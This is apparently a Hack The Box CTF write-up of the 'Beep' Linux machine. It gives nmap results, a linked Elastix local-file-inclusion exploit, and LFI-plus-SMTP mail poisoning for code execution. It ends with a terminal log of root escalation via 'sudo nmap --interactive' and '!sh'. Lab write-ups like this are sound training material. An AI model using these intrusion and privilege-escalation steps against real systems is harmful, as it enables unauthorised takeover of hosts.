---
layout: post
title: Beep
date: 2020-03-31
author: OutHackThem
comments: true
categories: htb
tags: [Linux,htb]
---

## Beep writeup

Easy Linux machine

![main]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Beep/main.png)


Let's do a quick nmap all ports

```perl

Nmap scan report for 10.10.10.7
Host is up (0.17s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: UIDL LOGIN-DELAY(0) APOP IMPLEMENTATION(Cyrus POP3 server v2) EXPIRE(NEVER) USER RESP-CODES PIPELINING STLS AUTH-RESP-CODE TOP
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: ACL THREAD=ORDEREDSUBJECT SORT=MODSEQ LISTEXT OK URLAUTHA0001 X-NETSCAPE CHILDREN IMAP4rev1 LITERAL+ SORT LIST-SUBSCRIBED BINARY NO CONDSTORE STARTTLS CATENATE ANNOTATEMORE UNSELECT QUOTA NAMESPACE Completed IDLE IMAP4 RIGHTS=kxte THREAD=REFERENCES ATOMIC MULTIAPPEND RENAME MAILBOX-REFERRALS ID UIDPLUS
443/tcp   open  ssl/https?
|_ssl-date: 2020-04-02T05:25:23+00:00; +5m16s from scanner time.
879/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 5m15s
                        

```

<br>

### Enumeration

- The Elastix application running on port 80 is vulnerable to LFI https://www.exploit-db.com/exploits/37637


![LFI]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Beep/lfi.png)

Now there is a method where you can achieve code execution using LFI and SMTP. 
Lets first try to verify if we can send mail using SMTP and also find some users using the /etc/passwd file from the LFI


![SMTP]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Beep/SMTP.png)



### Exploitation


Now I tried using fanis user but I could not read his mail so I tried again with asterisk and it worked, I sent a mail again to asterisk and read the mail using LFI which executed as code.

![codeexec]({{ site.giturl }}/MyCtfWriteups/assets/images/htb/Beep/codeexec.png)



Now post enumeration and priv esec 

```perl

bash-3.2$ id
id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
bash-3.2$ sudo -l
sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET
    XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$ 



bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
sh-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
sh-3.2# 




```